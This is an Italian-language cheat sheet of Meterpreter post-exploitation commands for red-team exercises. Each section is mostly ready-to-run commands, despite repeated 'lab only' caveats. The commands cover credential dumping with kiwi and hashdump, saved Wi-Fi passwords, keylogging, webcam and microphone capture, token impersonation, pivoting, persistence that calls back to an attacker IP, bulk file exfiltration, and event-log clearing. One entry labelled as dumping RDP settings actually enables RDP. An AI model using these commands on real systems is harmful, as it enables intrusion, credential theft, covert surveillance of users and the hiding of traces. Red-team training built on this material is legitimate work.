# 🔥 Comandi Meterpreter Utili in Attività Red Team

Questi comandi aiutano a simulare attività tipiche di un attaccante durante un esercizio di Red Teaming, ma in modo controllato e formativo.
---

## 🧭 **1. Ricognizione dell’host**

### Informazioni generali

```bash
sysinfo
getuid
getprivs
```

### Network

```bash
ipconfig
netstat
route
arp
```

### Enumerazione utenti

```bash
getenv USERNAME
enumdesktops
```

### Ricognizione file system

```bash
ls
pwd
search -f *.txt
search -f password.txt
```

---

## 📡 **2. Raccolta informazioni e credenziali**

### Dump credenziali (in laboratorio)

```bash
load kiwi
kiwi_cmd "creds_all"
```

### Dump SAM (solo se si hanno i privilegi e in lab!)

```bash
hashdump
```

---

## 🎯 **3. Controllo del sistema**

### Ottenere una shell di sistema

```bash
shell
```

### Elevazione dei privilegi (tentativo automatico)

```bash
getsystem
```

### Lista processi e scelta di uno stabile per migrazione

```bash
ps
migrate <PID>
```

---

## 🖥️ **4. Rilevamento attività dell’utente**

### Screenshot

```bash
screenshot
```

### Webcam (solo in ambiente didattico e autorizzato)

```bash
webcam_list
webcam_snap
```

### Audio (solo laboratorio)

```bash
record_mic
```

---

## 🔄 **5. Movimenti laterali – Fase avanzata (solo LAN di laboratorio)**

### Scansione interna tramite modulo portscan

```bash
run post/multi/gather/portscan/tcp
```

### Recupero informazioni host vicini

```bash
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
```

---

## 📌 **6. Persistenza (solo in ambiente controllato)**

**⚠️ Nota:** Queste tecniche si usano solo sul *tuo ambiente di test*, mai su sistemi reali senza autorizzazione.

### Esempio di persistente basata su servizio

```bash
run persistence -X -i 5 -p 5555 -r <IP KALI>
```

---

## 📤 **7. Esfiltrazione controllata**

### Download file

```bash
download <percorso/file>
```

### Upload file (per strumenti interni)

```bash
upload /path/file.exe
```

---

## 📂 **8. Gestione sessioni e multi-handler**

### Mettere in background

```bash
background
```

### Lista sessioni

```bash
sessions
```

### Riprendere una sessione

```bash
sessions -i <ID>
```

---

## 🧹 **9. Pulizia (OpSec)**

### Cancellare file creati durante il test

```bash
rm <file>
```

### Uscire dalla sessione

```bash
exit
```

---

# 🔥 Comandi Meterpreter Avanzati da Red Team

## 🧭 1. Ricognizione Avanzata di Sistema

### Enumerare software installato

```bash
run post/windows/gather/enum_applications
```

### Enumerare connettività Wi-Fi

```bash
run post/windows/gather/wlan/wlan_profile
```

### Enumerare i servizi

```bash
run post/windows/gather/enum_services
```

### Enumerazione chiavi di registro sensibili

```bash
reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

---

# 🛠️ 2. Privilege Escalation & User Hunting

### Verificare token disponibili

```bash
use incognito
list_tokens -u
```

### Usare un token (delegazione) — LAB ONLY

```bash
impersonate_token "DOMAIN\\Administrator"
```

### Ricerca automatica potenziali privilege escalation

```bash
run post/multi/recon/local_exploit_suggester
```

---

# 🔄 3. Movimento Laterale (LAB)

### Port forwarding (per pivoting interno)

```bash
portfwd add -l 3389 -p 3389 -r <IP_TARGET>
```

### Creare tunnel SOCKS4a per pivoting

```bash
run autoroute -s 192.168.1.0/24
```

Avviare SOCKS:

```bash
use auxiliary/server/socks_proxy
run
```

---

# 🕵️‍♂️ 4. Keylogging & Monitoraggio dell’utente

### Avviare keylogger (in laboratorio)

```bash
keyscan_start
```

### Recuperare output

```bash
keyscan_dump
```

### Fermare keylogger

```bash
keyscan_stop
```

---

# 🖼️ 5. Raccolta Informazioni Visive

### Listare desktop attivi

```bash
enumdesktops
```

### Cambiare desktop (se multi-user)

```bash
setdesktop <ID>
```

---

# 📡 6. Network & LAN Lateral Discovery

### Enumerare host nella LAN tramite ARP

```bash
arp
```

### Scansione porte da Meterpreter

```bash
run post/multi/gather/portscan/tcp RHOSTS=192.168.1.0/24 PORTS=1-1000 THREADS=50
```

---

# 📂 7. Raccolta Informazioni Sensibili (LAB)

### Dump policy password

```bash
run post/windows/gather/local_admin_search_enum
```

### Dump Scheduled Tasks

```bash
run post/windows/gather/enum_scheduled_tasks
```

---

# 📤 8. Exfiltration & File Handling Avanzato

### Zip di una directory intera

```bash
zip <nome.zip> C:\\Users\\nome\\Documents
```

### Leggere file grosse dimensioni

```bash
download -r C:\\Users\\nome\\Desktop
```

---

# 🧹 9. OpSec / Pulizia Tracce (LAB)

### Cancellare script o file caricati

```bash
rm <file.exe>
```

### Pulire log recenti (solo LAB)

```bash
clearev
```

---

# 🚀 10. Persistence Avanzata (LAB)

### Persistenza via schtasks

```bash
run persistence -U -i 10 -p 5555 -r <IP_KALI>
```

### Persistenza tramite chiave registry Run

```bash
run persistence -R -i 10 -p 5555 -r <IP_KALI>
```

---

# 🎯 11. Uso di Moduli Post-Exploitation Targeted

### Enumerazione password Wi-Fi salvate

```bash
run post/windows/gather/credentials/wifi
```

### Dump RDP Settings

```bash
run post/windows/manage/enable_rdp
```

### Enumerare condivisioni di rete

```bash
run post/windows/gather/enum_shares
```

---
